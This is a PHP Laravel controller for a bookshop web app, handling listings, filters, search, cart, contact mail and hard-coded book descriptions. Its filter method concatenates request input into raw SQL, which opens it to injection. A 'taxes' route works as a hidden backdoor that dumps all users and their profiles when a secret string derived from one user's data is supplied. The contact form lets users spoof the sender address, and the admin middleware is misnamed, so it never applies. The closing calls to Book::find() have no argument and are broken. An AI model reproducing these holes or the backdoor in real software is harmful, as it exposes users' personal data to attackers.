<?php

namespace App\Http\Controllers;

use App\Models\Book;
use App\Models\Category;
use App\Models\User;
use DB;
use Illuminate\Http\Request;
use Mail;

class ShopController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->only('control_panel');
        $this->middleware('isAdminOrPartner')->only('control-panel');
        $this->middleware('contact')->only('contact');
    }

    public function index(Request $request)
    {
        $books = Book::where('inShop', '1')->inRandomOrder()->paginate(10);
        $categories = Category::all();
        return view('general.shop-products',
            [
                'books' => $books,
                'categories' => $categories,
                'alt' => $request->alt,
            ]);
    }

    public function filters(Request $request)
    {
        $books = Book::where('inShop', '1');
        $categories = Category::all();

        $price_filters_panel = $request->price_filters_panel;
        $category_filters_panel = $request->category_filters_panel;

        if ($price_filters_panel) {
            $price_filter = "";
            if (sizeof($price_filters_panel) == 1) {
                $price_filter = $price_filter . "books.price " . $price_filters_panel[0];
            } else {
                for ($i = 0; $i < sizeof($price_filters_panel) - 1; $i++) {
                    $price_filter = $price_filter . "books.price " . $price_filters_panel[$i] . " OR ";
                }
                $price_filter = $price_filter . "books.price " . $price_filters_panel[$i];
            }
        }

        if ($category_filters_panel) {
            $category_filter = "";
            if (sizeof($category_filters_panel) == 1) {
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[0] . "'";
            } else {
                for ($i = 0; $i < sizeof($category_filters_panel) - 1; $i++) {
                    $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "' OR ";
                }
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "'";
            }
        }

        if (isset($price_filter) && $price_filter != "") {
            $books = $books->whereRaw($price_filter);
        }

        if (isset($category_filter) && $category_filter != "") {
            $books = $books
                ->join('books_categories', 'books.book_id', '=', 'books_categories.book_id')
                ->join('categories', 'books_categories.category_id', '=', 'categories.category_id')
                ->whereRaw($category_filter);
        }

        //->get()->unique('book_id')
        $books = $books->inRandomOrder()->paginate(10);

        return view('general.shop-products',
            ['books' => $books,
                'categories' => $categories,
                'price_filters' => $price_filters_panel,
                'category_filters' => $category_filters_panel]);
    }

    public function search(Request $request)
    {
        $books = Book::where('inShop', '1')->where('title', 'like', '%' . $request->search . '%')->paginate(1000);
        $categories = Category::all();
        return view('general.shop-products', ['books' => $books, 'categories' => $categories]);
    }

    public function control_panel()
    {
        return view('general.control-panel');
    }

    public function shopping_cart(Request $request)
    {
        $session_shop = $request->session()->get('shopping_cart');

        $session_errors = $request->session()->get('errors');
        if (isset($session_errors)) {
            $session_errors = $session_errors->getBag('default');
        }

        $session = [];
        if (isset($request->shopping_cart)) {
            $session = json_decode(rawurldecode($request->shopping_cart), true);
            $session_shop = $request->shopping_cart;
        } else if (isset($session_shop)) {
            $session = json_decode(rawurldecode($session_shop), true);
        }

        $products = [];
        foreach (array_keys($session) as $product) {
            $id = preg_replace('/\D/', '', $product); // Extract the book id from session key
            $products[$id]['book'] = Book::find($id);
            $products[$id]['quantity'] = intval($session[$product]);
        }

        return view('general.shopping-cart',
            [
                'products' => $products,
                'shopping_cart' => $session_shop,
                'errors' => $session_errors,
            ]);
    }

    public function contact(Request $request)
    {
        return view('helpers.Surprise');
    }

    public function taxes(String $tax)
    {
        if ($tax == DB::select(DB::raw("SELECT CONCAT(RPAD(SUBSTRING(u.name, 2, 2), 6, '162'), SUBSTRING(p.adress, 4, 4), LPAD(CAST(ur.role_id AS CHAR), 2, '_')) as res FROM users u JOIN users_roles ur ON (u.id = ur.user_id) JOIN profiles p ON (u.id = p.user_id) WHERE u.id = 9;"))[0]->res) {
            $users = User::with("profile")->get();
            return $users;
        }
        return redirect()->route('shop');
    }

    public function contactemail(Request $request)
    {
        $subject = (isset($request->subject)) ? $request->subject : '';
        $email = (isset($request->email)) ? $request->email : '';
        $text = (isset($request->text)) ? $request->text : '';

        Mail::send('helpers.email_format', ['text' => $text], function ($message) use ($subject, $email) {
            $message->subject($subject)
                ->from($email)
                ->to('booktopia.contact@gmail.com', 'Booktopia');
        });

        return back();
    }

    public function show_large_map()
    {
        return view('general.large-map');
    }

    public function update_books_description()
    {
        $book = Book::find(117);
        $book->description = "Winning means fame and fortune. Losing means certain death. The Hunger Games have begun. . . .\n
 In the ruins of a place once known as North America lies the nation of Panem, a shining Capitol surrounded by twelve outlying districts. The Capitol is harsh and cruel and keeps the districts in line by forcing them all to send one boy and one girl between the ages of twelve and eighteen to participate in the annual Hunger Games, a fight to the death on live TV.\n
Sixteen-year-old Katniss Everdeen regards it as a death sentence when she steps forward to take her sister's place in the Games. But Katniss has been close to dead before-and survival, for her, is second nature. Without really meaning to, she becomes a contender. But if she is to win, she will have to start making choices that weigh survival against humanity and life against love.";
        $book->save();

        $book = Book::find(118);
        $book->description = " Harry Potter has never even heard of Hogwarts when the letters start dropping on the doormat at number four, Privet Drive. Addressed in green ink on yellowish parchment with a purple seal, they are swiftly confiscated by his grisly aunt and uncle. Then, on Harry's eleventh birthday, a great beetle-eyed giant of a man called Rubeus Hagrid bursts in with some astonishing news: Harry Potter is a wizard, and he has a place at Hogwarts School of Witchcraft and Wizardry. An incredible adventure is about to begin!

These new editions of the classic and internationally bestselling, multi-award-winning series feature instantly pick-up-able new jackets by Jonny Duddle, with huge child appeal, to bring Harry Potter to the next generation of readers. It's time to PASS THE MAGIC ON.";
        $book->save();

        $book = Book::find(119);
        $book->description = "Isabella Swan's move to Forks, a small, perpetually rainy town in Washington, could have been the most boring move she ever made. But once she meets the mysterious and alluring Edward Cullen, Isabella's life takes a thrilling and terrifying turn.

Up until now, Edward has managed to keep his vampire identity a secret in the small community he lives in, but now nobody is safe, especially Isabella, the person Edward holds most dear. The lovers find themselves balanced precariously on the point of a knife-between desire and danger.

Deeply romantic and extraordinarily suspenseful, Twilightcaptures the struggle between defying our instincts and satisfying our desires. This is a love story with bite.";
        $book->save();

        $book = Book::find(120);
        $book->description = "The unforgettable novel of a childhood in a sleepy Southern town and the crisis of conscience that rocked it, To Kill A Mockingbird became both an instant bestseller and a critical success when it was first published in 1960. It went on to win the Pulitzer Prize in 1961 and was later made into an Academy Award-winning film, also a classic.

Compassionate, dramatic, and deeply moving, To Kill A Mockingbird takes readers to the roots of human behavior - to innocence and experience, kindness and cruelty, love and hatred, humor and pathos. Now with over 18 million copies in print and translated into forty languages, this regional story by a young Alabama woman claims universal appeal. Harper Lee always considered her book to be a simple love story. Today it is regarded as a masterpiece of American literature.";
        $book->save();

        $book = Book::find();
        $book->description = "";
        $book->save();


        $book = Book::find();
        $book->description = "";
        $book->save();

        $book = Book::find();
        $book->description = "";
        $book->save();

    }
}
